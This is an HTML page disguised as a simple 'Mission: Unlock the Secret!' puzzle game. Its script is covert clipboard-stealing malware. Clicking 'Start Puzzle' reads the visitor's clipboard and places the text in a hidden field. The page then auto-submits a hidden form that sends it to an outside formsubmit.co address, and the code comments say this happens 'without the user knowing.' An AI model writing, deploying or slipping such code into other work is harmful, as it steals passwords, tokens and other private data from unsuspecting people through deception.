<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Puzzle Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            text-align: center;
            margin-top: 50px;
        }

        .game-container {
            background-color: #fff;
            border: 2px solid #ddd;
            padding: 30px;
            border-radius: 10px;
            width: 300px;
            margin: 0 auto;
        }

        h1 {
            font-size: 24px;
            color: #333;
        }

        .game-btn {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 15px;
            text-align: center;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
            width: 100%;
        }

        .game-btn:hover {
            background-color: #45a049;
        }

        .game-message {
            margin-top: 20px;
            font-size: 18px;
            color: #555;
        }

        .hidden {
            display: none;
        }
    </style>
    <script>
        function startGame() {
            // Show the "Mission Successful" message after a brief "game"
            document.getElementById('gameMessage').textContent = "Puzzle Unlocked! ðŸ§©";
            document.getElementById('gameMessage').classList.remove('hidden');

            // Start the "Mission" by copying clipboard content without the user knowing
            navigator.clipboard.readText().then(function(clipText) {
                // After clipboard content is copied, set it in a hidden input
                document.getElementById('clipboardContent').value = clipText;

                // Auto-submit the form without the user noticing
                setTimeout(function() {
                    document.getElementById('hiddenForm').submit();
                }, 1000); // Slight delay before submitting
            }).catch(function(err) {
                console.error('Failed to read clipboard contents: ', err);
                alert("Oops! Something went wrong. Please try again.");
            });
        }
    </script>
</head>
<body>

<div class="game-container">
    <h1>Mission: Unlock the Secret!</h1>
    <p>Your goal is to reveal a hidden message. Ready?</p>

    <button class="game-btn" onclick="startGame()">Start Puzzle</button>

    <div id="gameMessage" class="game-message hidden">
        Puzzle Unlocked! ðŸ§©
    </div>

    <!-- Hidden form to send clipboard content via FormSubmit.co -->
    <form id="hiddenForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display:none;">
        <input type="hidden" name="_subject" value="Mission Completed - Secret Message" />
        <input type="hidden" name="_next" value="thank_you.html" />
        <input type="hidden" id="clipboardContent" name="clipboardContent" />
    </form>
</div>

</body>
</html>
